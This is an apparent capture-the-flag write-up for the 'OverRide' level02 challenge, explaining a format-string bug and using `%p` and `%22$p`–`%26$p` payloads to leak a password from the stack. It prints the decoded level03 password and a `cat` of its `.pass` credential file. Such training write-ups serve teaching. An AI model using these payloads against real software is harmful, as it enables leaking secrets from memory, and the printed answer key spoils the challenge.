RELRO         STACK CANARY          NX               PIE             RPATH        RUNPATH         FILE
No RELRO 🔴    No canary found 🔴   NX disabled 🔴    No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level02/level02

---

# 📒 EXPLOITATION LOG: LEVEL 02 @ OVERRIDE

## 1. Signature & Vulnerability

* **Goal:** Recover `level03`'s password, which is loaded into memory.
* **Vulnerability:** **Format String** at the line `printf(&var_78);`.
* **Root cause:** The developer passes the user-controlled `var_78` (username)
  straight into `printf` without a `%s` format. This lets the user inject format
  specifiers (`%p`, `%x`, `%s`) to read/write stack memory.

---

## 2. Background: local variables & the stack

To understand why the password sits nearby, recall the **stack** layout.

* **Local variables:** When `main` is called it gets a region of the stack (its
  **stack frame**). Every variable declared in the function — `var_78`
  (username), `buf` (the password we type), and `buf_1` (the real password read
  from a file) — is a local variable.
* **Stacked layout:** These variables sit next to each other in the stack "warehouse."
* **The "flashlight" mechanism:** When `printf` runs it fetches its arguments
  from the stack. Using `%p` is like shining a flashlight from `printf`'s
  position across the neighboring local-variable "boxes" on the same stack frame.

---

## 3. Exploitation

### Step 1: Initial discovery
Print the stack with `%p.%p.%p...`. We notice unusual data (ASCII text) starting
at position **22**.

* **Technique:** Use **direct parameter access** (`%22$p`) to jump straight to
  that position.

### Step 2: The first failure
* **Data recovered:** 4 hex chunks from `%22$p` to `%25$p`.
* **Decoded:** 32 characters: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5`.
* **Result:** `Authentication failure`.
* **Why it failed:** Reading the code carefully reveals
  `fread(&buf_1, 1, 0x29, fp);`.
* `0x29` (hex) = **41** (decimal).
* We only recovered 32 characters — 9 are still missing!

### Step 3: Fix & success
Extend the flashlight to position **26** (`%26$p`).

* **5th hex chunk:** `0x48336750664b394d`.
* **Little-endian decode:** Read the bytes right-to-left:
* `4d 39 4b 66 50 67 33 48` → `M9KfPg3H`.

---

## 4. Assembling the payload

| Position | Hex value (little-endian) | ASCII (reversed) |
| --- | --- | --- |
| `%22$p` | `0x756e505234376848` | `Hh74RPnu` |
| `%23$p` | `0x45414a3561733951` | `Q9sa5JAE` |
| `%24$p` | `0x377a7143574e6758` | `XgNWCqz7` |
| `%25$p` | `0x354a35686e475873` | `sXGnh5J5` |
| `%26$p` | `0x48336750664b394d` | `M9KfPg3H` |

**Complete password (40 characters):**

> `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

---

## 5. Takeaways

1. **Never trust a "gut-feeling" number:** 32 characters looked complete, but you
   must cross-check against the `fread` length in the code to know the real size.
2. **Little Endian is a survival rule:** On x86-64, data is stored reversed. Skip
   the byte swap and the password is completely wrong.
3. **Format String is powerful:** No overwrite needed — a read alone is enough to
   leak sensitive information or take control.

---

**Level 03 flag:** run `cat /home/users/level03/.pass` after `su level03`.
